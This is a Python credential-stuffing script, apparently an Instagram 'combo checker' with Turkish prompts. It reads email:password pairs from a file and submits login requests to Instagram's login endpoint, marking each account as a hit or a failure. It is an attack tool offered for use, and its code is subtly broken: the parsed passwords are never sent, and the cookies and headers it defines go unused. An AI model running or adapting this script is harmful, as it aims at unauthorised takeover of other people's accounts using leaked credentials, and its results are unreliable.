import requests
from shutil import copy as x
from webbrowser import open as ac
from os import system as terminal
from pyfiglet import figlet_format as banner

HEADER = '\033[95m'
OKBLUE = '\033[94m'
OKCYAN = '\033[96m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'

ac("https://github.com/R4tCoder/")
tg = f"{HEADER}tg = {WARNING}@Qw4xLine{ENDC}"
dc = f"{BOLD}Dc = {FAIL}@ibrahim_sanal{ENDC}"
name = f"{OKCYAN}R4t Coder{ENDC}"
logo = banner(f"""          Ig
    Check
""", font="slant")
print(OKGREEN + logo + f"                                   {name}")
print(f"                                   {tg}")
print(f"                                   {dc}\n")

print(f"{OKBLUE}Ör:combo.txt{ENDC}")
comp = input(f"{WARNING}[÷]Combo Yolunu Giriniz: {BOLD}{ENDC}")
cookies = {
    'csrftoken': 'tQRO0TV9eKfsKpvtq24aAo',
    'datr': 'pH51Zz0U7ExAhqMNLqF63DG7',
    'ig_did': '3BB7A6FA-00DA-465E-AE4B-6668E686B083',
    'dpr': '2.4000000953674316',
    'mid': 'Z3V-pAABAAErtwf8fdZ1gOJ1AX-a',
    'ps_l': '1',
    'ps_n': '1',
    'ig_nrcb': '1',
    'wd': '450x865',
}

headers = {
    'authority': 'www.instagram.com',
    'accept': '*/*',
    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://www.instagram.com',
    'referer': 'https://www.instagram.com/accounts/login/?source=post_chaining_impression_limit',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-full-version-list': '"Chromium";v="107.0.5304.74", "Not=A?Brand";v="24.0.0.0"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"JNY-LX1"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"10.0.0"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; JNY-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'x-asbd-id': '129477',
    'x-csrftoken': 'tQRO0TV9eKfsKpvtq24aAo',
    'x-ig-app-id': '1217981644879628',
    'x-ig-www-claim': '0',
    'x-instagram-ajax': '1019110351',
    'x-requested-with': 'XMLHttpRequest',
    'x-web-session-id': '9j2rda:6l5uyn:vv7z8z',
}

def combo(comp):
    try:
        with open(comp, 'r') as file:
            for line in file:
                try:
                    email, password = line.split(':')
                    data = {
                        'enc_password': '#PWD_INSTAGRAM_BROWSER:10:1735753912:AU1QAM9jBtiejdTysxxMtT5U+P9djPuOP01x/fTYX9FvyiA1ekmu93H5P7Gp4iICdpDjGsRucfQBpir4iiRtJXDBJiRvPJVqkl2nXuNMhJCCu1oJNrks2c2Nw+AxUCPcvt5q41EbQnOKxLBV',
                        'caaF2DebugGroup': '1',
                        'loginAttemptSubmissionCount': '3',
                        'optIntoOneTap': 'false',
                        'queryParams': '{"source":"post_chaining_impression_limit"}',
                        'trustedDeviceRecords': '{}',
                        'username': email
                    }
                    response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', data=data)
                    if response.status_code == 200:
                        print(f"{UNDERLINE}{BOLD} Win : {OKBLUE} {email} {ENDC}")
                    else:
                        print(f"{UNDERLINE}{BOLD} FAIL : {FAIL} {email} {ENDC}")
                except Exception as e:
                    print(e)
    except Exception as e:
        print(e)

combo(comp)
